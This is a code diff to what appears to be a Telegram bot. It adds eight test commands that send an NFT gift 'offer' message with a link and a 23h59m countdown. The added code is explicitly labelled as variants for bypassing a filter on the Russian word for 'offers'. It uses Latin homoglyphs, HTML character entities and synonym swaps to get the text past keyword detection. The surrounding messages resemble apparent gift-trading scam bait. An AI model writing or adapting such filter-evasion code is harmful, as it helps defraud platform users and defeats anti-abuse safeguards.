@@ -1505,6 +1505,48 @@ async def handle_text(message: Message, is_business: bool):
         await test_send(message, is_business, f"<b>{seller_name}</b> предлагает Вам <b>100₽</b> <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nСдeлкa aктивнa в тeчeниe <b>23ч 59м</b>.")
         return
     
+    # Варианты обхода слова "предлагает"
+    if low == "об1":
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        # Вариант 1: прeдлaгaeт (e и a латинские)
+        await test_send(message, is_business, f"<b>{seller_name}</b> прeдлaгaeт Вам <b>100₽</b> зa п&#1086;дaр&#1086;к <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nСдeлкa aктивнa в тeчeниe <b>23ч 59м</b>.")
+        return
+    if low == "об2":
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        # Вариант 2: пр&#1077;длагает (HTML entity для е)
+        await test_send(message, is_business, f"<b>{seller_name}</b> пр&#1077;длагает Вам <b>100₽</b> зa п&#1086;дaр&#1086;к <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nСдeлкa aктивнa в тeчeниe <b>23ч 59м</b>.")
+        return
+    if low == "об3":
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        # Вариант 3: п&#1088;&#1077;длагает (HTML entity для р и е)
+        await test_send(message, is_business, f"<b>{seller_name}</b> п&#1088;&#1077;длагает Вам <b>100₽</b> зa п&#1086;дaр&#1086;к <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nСдeлкa aктивнa в тeчeниe <b>23ч 59м</b>.")
+        return
+    if low == "об4":
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        # Вариант 4: предл&#1072;гает (HTML entity для а)
+        await test_send(message, is_business, f"<b>{seller_name}</b> предл&#1072;гает Вам <b>100₽</b> зa п&#1086;дaр&#1086;к <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nСдeлкa aктивнa в тeчeниe <b>23ч 59м</b>.")
+        return
+    if low == "об5":
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        # Вариант 5: оффeрит (замена слова + e латинская)
+        await test_send(message, is_business, f"<b>{seller_name}</b> оффeрит Вам <b>100₽</b> зa п&#1086;дaр&#1086;к <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nСдeлкa aктивнa в тeчeниe <b>23ч 59м</b>.")
+        return
+    if low == "об6":
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        # Вариант 6: п&#1088;eдлaгaeт (HTML entity р + латинские e, a)
+        await test_send(message, is_business, f"<b>{seller_name}</b> п&#1088;eдлaгaeт Вам <b>100₽</b> зa п&#1086;дaр&#1086;к <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nСдeлкa aктивнa в тeчeниe <b>23ч 59м</b>.")
+        return
+    if low == "об7":
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        # Вариант 7: предложил (другое время глагола)
+        await test_send(message, is_business, f"<b>{seller_name}</b> предложил Вам <b>100₽</b> зa п&#1086;дaр&#1086;к <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nСдeлкa aктивнa в тeчeниe <b>23ч 59м</b>.")
+        return
+    if low == "об8":
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        # Вариант 8: даёт (замена слова)
+        await test_send(message, is_business, f"<b>{seller_name}</b> даёт Вам <b>100₽</b> зa п&#1086;дaр&#1086;к <a href=\"{nft_link}\">WinterWreath #5056</a>.\n\nСдeлкa aктивнa в тeчeниe <b>23ч 59м</b>.")
+        return
+    
     # Команда офера настраивается администратором; точка перед ней необязательна.
     active_command = get_offer_command().lower()
     first_token = low.split(maxsplit=1)[0].lstrip(".") if low else ""
